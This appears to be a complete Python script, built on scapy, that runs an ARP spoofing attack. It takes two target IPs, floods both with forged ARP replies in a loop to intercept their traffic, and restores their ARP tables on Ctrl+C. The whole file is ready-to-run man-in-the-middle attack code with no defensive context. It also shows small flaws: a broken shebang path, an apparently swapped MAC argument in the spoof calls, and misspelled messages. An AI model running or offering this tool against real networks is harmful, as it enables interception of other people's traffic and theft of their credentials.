 #!usr/bin/env python

import scapy.all as scapy
import time
import optparse

def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-f", "--first_target", dest="first_target", help="Festr target ip")
	parser.add_option("-s", "--second_target", dest="second_target", help="Second target ip")
	(options, arguments) = parser.parse_args()
	if not options.first_target:
		parser.error("[-] Please specify an first_target , use --help for more info.")
	if not options.second_target:
		parser.error("[-] Please specify an second_target , use --help for more info.")
	return options

def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
	brodcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_request_brodcast = brodcast/arp_request
	answered_list = scapy.srp(arp_request_brodcast, timeout=1, verbose=False)[0]
	
	return(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip, spoof_mac):
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst = spoof_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)
	
def restore(target_ip, router_ip):
	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = router_ip	, hwsrc = get_mac(router_ip))
	scapy.send(packet, count=4, verbose=False)

def arp_spoofing(target_ip, router_ip):
	sent_pacets_count = 0
	try:
		while True:
			router_mac = get_mac(router_ip)
			target_mac = get_mac(target_ip)
			for i in range(1, 25):
				spoof(target_ip, router_ip, router_mac)
				spoof(router_ip, target_ip, target_mac)
				sent_pacets_count+=2
				print("\r[+] Pacets sent: " + str(sent_pacets_count), end=' ')
				time.sleep(2)
	except KeyboardInterrupt:
		print("\n[+] Dtetected CTRL + C \n[+] Restoring... \n[+] Quitting...")
		restore(target_ip, router_ip)
		restore(router_ip, target_ip)

options = get_arguments()
arp_spoofing(options.first_target, options.second_target)
